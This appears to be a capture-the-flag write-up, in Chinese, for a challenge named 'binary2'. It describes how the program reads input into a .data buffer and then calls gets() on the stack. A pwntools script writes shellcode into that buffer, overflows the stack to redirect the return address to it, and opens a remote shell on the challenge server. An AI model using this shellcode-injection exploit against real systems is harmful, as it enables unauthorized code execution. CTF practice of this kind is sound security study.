## binary2
binary先`read()` 50 bytes到.data的name中，再`gets()`到stack上，因此先在`name`寫入shellcode，再以buffer overflow將return address複寫為`&name`。
```python
#!/usr/bin/env python3
from pwn import *

context.update(os='linux', arch='amd64')

payload = b''
payload += asm(shellcraft.sh()) # shellcode
payload += cyclic(50 - len(payload)).encode() # padding since will read 50 bytes
payload += cyclic(40).encode() + p64(0x601080) # overwrite return address

r = remote('pwnhub.tw', 54321)
r.sendline(payload)
r.interactive()
```
